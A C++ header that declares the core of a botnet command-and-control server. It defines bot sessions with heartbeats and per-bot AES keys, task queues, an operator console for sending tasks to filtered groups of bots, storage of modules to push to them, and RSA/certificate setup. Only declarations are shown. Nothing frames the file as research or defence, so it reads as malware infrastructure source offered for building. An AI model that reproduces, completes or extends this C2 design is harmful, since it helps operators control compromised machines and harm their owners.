
#ifndef C2_SERVER_HPP
#define C2_SERVER_HPP

#include "protocol.hpp"
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <map>
#include <queue>
#include <ctime>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <sqlite3.h>
#include <condition_variable>

// Represents a task for a bot
struct Task {
    std::string task_id;
    uint8_t type;
    std::vector<char> data;
};

// Represents an active bot session (in-memory)
struct BotSession {
    int socket;
    std::string bot_id;
    std::string os_info;
    time_t last_heartbeat;
    unsigned char aes_key[aether::AES_KEY_BITS / 8];
    std::queue<Task> task_queue;
};

// The core, headless C2 daemon
class C2Core {
public:
    C2Core();
    ~C2Core();
    void run();
    void stop();

    // --- Operator Console API ---
    void queue_task_for_targets(const std::vector<std::string>& targets, const Task& task);
    std::vector<std::string> get_bot_ids_by_filter(const std::string& filter);
    void manage_group(const std::string& action, const std::string& group_name, const std::string& bot_id);
    void store_module(const std::string& name, const std::vector<char>& data);

private:
    void listener_thread();
    void handle_connection(int client_socket);
    void db_writer_thread();
    
    void send_task(BotSession& session, const Task& task);
    void handle_register(BotSession& session, const std::vector<char>& data);
    void handle_heartbeat(BotSession& session, const std::vector<char>& data);
    void handle_task_output(BotSession& session, const std::vector<char>& data);
    
    void init_database();
    void queue_db_query(const std::string& query);

    bool initialize_rsa();
    std::string get_public_key_pem();
    std::string get_cert_pem();

    // --- Member Variables ---
    int server_fd_;
    RSA* rsa_keypair_;
    X509* certificate_;
    
    std::map<std::string, BotSession> sessions_;
    std::mutex sessions_mutex_;
    
    sqlite3* db_;
    std::queue<std::string> db_queue_;
    std::mutex db_queue_mutex_;
    std::condition_variable db_cond_;
    
    bool running_;
    std::thread db_thread_;
};

// The operator's command console (client to the C2Core)
class OperatorConsole {
public:
    OperatorConsole(C2Core& core);
    void run();

private:
    C2Core& core_;
};

#endif // C2_SERVER_HPP
